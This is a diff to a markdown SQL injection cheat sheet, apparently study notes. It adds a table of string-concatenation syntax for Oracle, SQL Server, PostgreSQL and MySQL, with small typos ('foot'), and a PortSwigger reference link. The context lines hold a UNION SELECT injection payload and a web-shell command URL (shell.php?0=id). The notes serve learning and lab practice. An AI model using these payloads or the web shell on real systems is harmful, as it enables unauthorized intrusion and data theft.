@@ -112,6 +112,15 @@ Or we can use `@@version` and cycle through our available columns to see which o
 test') union select 1,@@version,3,4-- -
 ```
 
+### Concatenation (Useful if we only have 1 column being displayed)
+Concatenation enables you combine multipe strings into a single string.
+|DBMS|Syntax|
+|____|______|
+|Oracle|`'foo'||'bar'`|
+|MS|`'foot'+'bar'`|
+|Postgre|`'foo'||'bar'`|
+|MySQL|`'foot' 'bar'` or `CONCAT('foo','bar')`|
+
 ### Getting the Database Layout to locate and extract the data.
 Finding all of the DB's
 ```sql
@@ -247,6 +256,7 @@ http://serverip:port/shell.php?0=id
 ```
 
 # Resources
+[Portswigger SQLI Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 [PayloadsAllTheThings SQLI Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)  
 [PayloadsAllTheThings SQLI Deep Dive](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)  
 [Portswigger SQLI Labs](https://portswigger.net/web-security/all-labs#sql-injection)  
